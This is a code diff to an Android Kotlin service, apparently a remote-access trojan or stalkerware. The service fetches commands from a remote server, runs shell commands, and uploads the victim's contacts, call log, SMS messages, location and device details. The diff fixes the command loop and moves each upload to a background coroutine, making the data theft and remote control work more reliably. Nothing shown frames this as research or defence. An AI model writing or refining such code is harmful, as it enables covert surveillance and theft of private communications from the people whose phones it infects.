@@ -85,12 +85,16 @@ class CommandService : Service() {
         val deviceId = DeviceInfo.getDeviceId(this)
         val commands = apiService.fetchCommands(deviceId)
         
-        for (command in commands) {
+        for (i in 0 until commands.length()) {
             try {
+                val command = commands.getJSONObject(i)
                 executeCommand(command)
                 apiService.sendCommandResult(deviceId, command.getString("id"), "success", "Command executed")
             } catch (e: Exception) {
-                apiService.sendCommandResult(deviceId, command.getString("id"), "error", e.message ?: "Unknown error")
+                val command = commands.optJSONObject(i)
+                if (command != null) {
+                    apiService.sendCommandResult(deviceId, command.getString("id"), "error", e.message ?: "Unknown error")
+                }
             }
         }
     }
@@ -139,7 +143,9 @@ class CommandService : Service() {
         }
         
         val deviceId = DeviceInfo.getDeviceId(this)
-        apiService.uploadContacts(deviceId, contacts)
+        serviceScope.launch {
+            apiService.uploadContacts(deviceId, contacts)
+        }
     }
     
     private fun getCallLog() {
@@ -173,7 +179,9 @@ class CommandService : Service() {
         }
         
         val deviceId = DeviceInfo.getDeviceId(this)
-        apiService.uploadCallLog(deviceId, calls)
+        serviceScope.launch {
+            apiService.uploadCallLog(deviceId, calls)
+        }
     }
     
     private fun getSMS() {
@@ -202,7 +210,9 @@ class CommandService : Service() {
         }
         
         val deviceId = DeviceInfo.getDeviceId(this)
-        apiService.uploadSMS(deviceId, messages)
+        serviceScope.launch {
+            apiService.uploadSMS(deviceId, messages)
+        }
     }
     
     private fun getLocation() {
@@ -218,7 +228,9 @@ class CommandService : Service() {
     private fun getDeviceInfo() {
         val deviceId = DeviceInfo.getDeviceId(this)
         val deviceInfo = DeviceInfo.getDeviceInfo(this)
-        apiService.updateDeviceInfo(deviceId, deviceInfo)
+        serviceScope.launch {
+            apiService.updateDeviceInfo(deviceId, deviceInfo)
+        }
     }
     
     private fun sendSMS(command: JSONObject) {
@@ -309,7 +321,9 @@ class CommandService : Service() {
                 output.append(line).append("\n")
             }
             val deviceId = DeviceInfo.getDeviceId(this)
-            apiService.sendShellResult(deviceId, output.toString())
+            serviceScope.launch {
+                apiService.sendShellResult(deviceId, output.toString())
+            }
         } catch (e: Exception) {
             e.printStackTrace()
         }
